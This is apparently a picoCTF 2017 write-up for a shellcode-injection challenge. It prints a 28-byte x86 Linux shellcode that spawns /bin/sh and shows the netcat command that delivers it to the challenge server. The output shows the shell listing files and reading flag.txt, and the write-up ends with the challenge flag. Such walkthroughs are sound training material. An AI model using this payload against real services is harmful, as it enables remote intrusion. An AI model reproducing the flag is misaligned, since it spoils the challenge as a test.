Wow, I absolutely hate these problems. Shellcode's annoying.

Anyway, there is a whole truckload of pre-existing shellcode [here](http://shell-storm.org/shellcode/files/shellcode-811.php)
Some antiviruses don't like it, though (*cough* Norton *cough*)

The shellcode that works is 28 bytes:
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

and to make it work, you have to use python to make sure it all goes in in one piece.

```

$  (python -c "import sys; sys.stdout.write('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"; cat) | netcat shell2017.picoctf.com 49324
My mother told me to never accept things from strangers     
How bad could running a couple bytes be though?             
Give me 40 bytes:                                           
                                                            
ls                                                          
flag.txt                                                    
shellz                                                      
shellz_no_aslr                                              
xinetd_wrapper.sh                                           
cat flag.txt
51e2978e4e59013145c2613f01185802    
```
So, the flag is `51e2978e4e59013145c2613f01185802`
